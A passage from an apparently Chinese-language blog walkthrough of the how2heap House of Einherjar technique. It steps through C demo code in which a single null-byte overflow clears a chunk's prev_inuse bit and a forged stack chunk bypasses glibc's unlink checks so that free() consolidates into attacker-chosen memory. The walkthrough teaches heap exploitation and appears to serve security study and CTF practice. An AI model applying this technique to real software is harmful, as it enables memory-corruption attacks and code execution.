previous_size 记录了这个 chunk 的大小，而在 fastbin 中，不会将 p 为置为 0，所以 pre_size = 上一个 chunk 的 size）</p>\n<p>程序流程是：</p>\n<p>先申请一个堆 <code>a = (uint8_t*) malloc(0x38)</code> ，【不知道为什么实际申请的是 0x30】，然后创建一个数组 <code>size_t fake_chunk[6];</code>  ，用该数组来作为 fake_chunk（构造该结构符合 chunk），接着再申请一个堆 <code>b = (uint8_t*) malloc(0xf8);</code> 【这里实际大小为 0x100】</p>\n<p>接着利用 <code>a[real_a_size] = 0;</code>  划重点！！通过这种方式将 b 的 size 的 p 标志位覆盖为 0，导致成为 0x100（原来是 0x101，代表上一个 chunk 被占用），这里代表上一个 chunk 是被释放的 ；能导致覆盖的原因是数组的 0x38 其实是第 0x39 个位置（ <code>a[0x38]</code> ）</p>\n<p>然后修改 <code>fake_size</code>  为 从 b 头指针到 fake_chunk 的头指针的大小（ <code>size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);</code> ）</p>\n<h2 id=\"2调试程序-4\"><a class=\"anchor\" href=\"#2调试程序-4\">#</a> 2. 调试程序</h2>\n<h3 id=\"1执行到27行a-uint8_t-malloc0x38\"><a class=\"anchor\" href=\"#1执行到27行a-uint8_t-malloc0x38\">#</a> 1. 执行到 27 行 <code>a = (uint8_t*) malloc(0x38);</code></h3>\n<p>这里申请的是 0x38 的 chunk，但是实际只有 0x30【~~ 不过却可以修改 0x40 范围的数据，这点存疑～～后面理解是因为挨着的 top chunk 的 p 位是 1，那么证明这个 chunk a 被使用，可以使用下个 chunk 的 size 位】</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/4U%5DXS%28CIPRGXTB5RS%7D7B%5DVO.png\" alt=\"\" /></p>\n<h3 id=\"2执行到31行printfsince-we-want-to-overflow-a-we-need-the-real-size-of-a-after-rounding-xn-real_a_size\"><a class=\"anchor\" href=\"#2执行到31行printfsince-we-want-to-overflow-a-we-need-the-real-size-of-a-after-rounding-xn-real_a_size\">#</a> 2. 执行到 31 行 <code>printf(&quot;Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\\n&quot;, real_a_size);</code></h3>\n<p>查看 a 的真实大小，发现是 0x38（只算 data 域，这里基本是与下一个 chunk 的 pre_siez 共用了）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/6C0%7DZ_W3FM2%7D06ZAPFH%40VR3.png\" alt=\"\" /></p>\n<h3 id=\"3执行到55行伪造chunk再栈上\"><a class=\"anchor\" href=\"#3执行到55行伪造chunk再栈上\">#</a> 3. 执行到 55 行 <code>伪造chunk再栈上</code></h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// size of the chunk just needs to be small enough to stay in the small bin</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// fwd</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// bck</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//fwd_nextsize</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//bck_nextsize</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk at %p looks like:\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prev_size (not used): %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/FW31%60%5BGLJW7I%40%24V%241%25%28QYI4.png\" alt=\"\" /></p>\n<p>这里的伪造为了绕过 unlink 检测（后面要将这个块视为 larger bin 取出来合并）</p>\n<p>unlink 的检测 (在后面 free 触发合并的时候才执行)：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token expression\">FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token expression\">BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </span><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token expression\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </span><span class=\"token comment\">// 检测是否为双链表结构</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \\</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t<span class=\"token comment\">// 判断是否为 lagrebin\t\t\t      \\</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            &amp;&amp; __builtin_expect (P->fd_nextsize != NULL, 0)) &#123;\t\t      \\</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t      \\</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \\</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t      malloc_printerr (check_action,\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t       \"corrupted double-linked list (not small)\",    \\</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t       P, AV);   // 判断 largebin 是否为双链表结构</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      \\</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      \\</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      \\</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      \\</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      \\</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>unlink 检测只是检测了要被取出来的 chunk 是否是双链表结构，而 <code>不检查其是否真的在smallbin或者largebin中</code> ，因此例子里就 fd，bk 等等指向自己，用自己构造了一个双链表满足条件来绕过检测</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40J%2980L6O4%28A6TO8B%40IF9%29%5B6.png\" alt=\"\" /></p>\n<h3 id=\"4执行到64行\"><a class=\"anchor\" href=\"#4执行到64行\">#</a> 4. 执行到 64 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_b_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe allocate 0xf8 bytes for 'b'.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b: %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里感觉 pwndbg 的显示堆大小是加上了头部的 0x10，并没有算上下个 chunk 的 pre_size 位，实际大小是加上下一个 chunk 的 pre_size 才到 0xf8 的大小</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%28QE%25%7E%7D42JJXYJF%40322DUAZD.png\" alt=\"\" /></p>\n<h3 id=\"5执行到69行\"><a class=\"anchor\" href=\"#5执行到69行\">#</a> 5. 执行到 69 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span> b_size_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nb.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里用 <code>b_size_ptr</code>  指针指向了 chunk b 的 size 位，，打印了 size 的值</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/TFU%60TL%29K%5DX08J5CXR%5DO%5D%7E%7EE.png\" alt=\"\" /></p>\n<p>这里的也是头部的 0x10 然后没有算上共用的 pre_size 位</p>\n<h3 id=\"6-执行到77行\"><a class=\"anchor\" href=\"#6-执行到77行\">#</a> 6. 执行到 77 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nb.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size is: (0x100) | prev_inuse = 0x101\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\ta<span class=\"token punctuation\">[</span>real_a_size<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is easiest if b.size is a multiple of 0x100 so you \"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t   <span class=\"token string\">\"don't change the size of b, only its prev_inuse bit\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"If it had been modified, we would need a fake chunk inside \"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t   <span class=\"token string\">\"b where it will try to consolidate the next chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里是利用 <code>a[real_a_size]来进行溢出，覆盖chunk b 的size的p位为0</code> ，因为这里是利用了数组 <code>a[0x38]</code>  实际是第 0x39 的位置，这里 P 标志位为 0 后，上一个 chunk 就会被视为是空闲的 chunk，可以绕过 free 的检测，并且会将 pre_siez 的值视为上一个 chunk（紧挨着的低地址的 chunk）的 size 大小</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/WNBY5J63Q87IY%5B63A54UU%60M.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%24N%24A9U%7D1B%28IRNB%5DO0KMEYLC.png\" alt=\"\" /></p>\n<h3 id=\"7执行到83行\"><a class=\"anchor\" href=\"#7执行到83行\">#</a> 7. 执行到 83 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">size_t</span> fake_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake prev_size will be %p - %p = %#lx\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">,</span> fake_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里计算了要伪造 fake_chunk 的 size 大小（chunk b 为高地址作为下一个 chunk，而 fake_chunk 的地址为低地址，作为上一个 chunk），所以 size 大小 (距离) 是高地址减地址，这里 <code>b-sizeof(size_t)*2)</code>  是从 b 的头部指针开始，上面的计算结果就是图里的 fake_size</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/N%25VGR%40R%29MN%29E%5B788G%7E8C%40%40Y.png\" alt=\"\" /></p>\n<p>这里的结果其实是负数，其实也就是 fake_chunk 在高地址处，不过为了合并就将它视为地址</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%24%28SJ8ZBQT_V%5BIJVU6%5DLQ%5D%28G.png\" alt=\"\" /></p>\n<h3 id=\"8执行到88行\"><a class=\"anchor\" href=\"#8执行到88行\">#</a> 8. 执行到 88 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">[</span>real_a_size<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//Change the fake chunk's size to reflect b's new prev_size</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nModify fake chunk's size to reflect b's new prev_size\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里是将 b 的 <code>pre_size</code>  修改为了 <code>fake_chunk</code>  的大小 (a 的数据段用了 b 的 <code>pre_size</code> , 所以可以修改)，也就让合并时可以通过 b 的 <code>pre_size</code>  向前寻找这个大小找到 <code>fake_chunk</code> ；后面也修改了 <code>fake_chunk</code>  的 size</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%7BFBM%5B1%25N%60WE%5D%7E5%25F%5D%24PL%60I6.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/%40G%25V%404JSGB%2875TVZI_948VU.png\" alt=\"\" /></p>\n<h3 id=\"9执行到93行\"><a class=\"anchor\" href=\"#9执行到93行\">#</a> 9. 执行到 93 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// free b and it will consolidate with our fake chunk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里就 <code>free(b)</code> ，会触发合并，上面几个步骤修改 fake_chunk 的 size 为 fake_size 的地方其实是为了绕过一个检测（没有在源码找到对于检测），这样能够成功合并</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/YTWW9Z%7DV838%7B%7ETMT_VYU%60_0.png\" alt=\"\" /></p>\n<p>在 fake_chunk 中，它的 size 被改变了，但是与示例注释说明的并不一样，其 size 增加了 <code>20FC1</code> (0x77C351-0x75B390)</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/4%40%40F9U6ZT8%5BE5PT%5D2BQ92Z5.png\" alt=\"\" /></p>\n<h3 id=\"10执行到最后\"><a class=\"anchor\" href=\"#10执行到最后\">#</a> 10. 执行到最后</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//if we allocate another chunk before we free b we will need to </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">//do two things: </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//1) We will need to adjust the size of our fake chunk so that</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">//fake_chunk + fake_chunk's size points to an area we control</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">//2) we will need to write the size of our fake chunk</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">//at the location we control. </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">//After doing these two things, when unlink gets called, 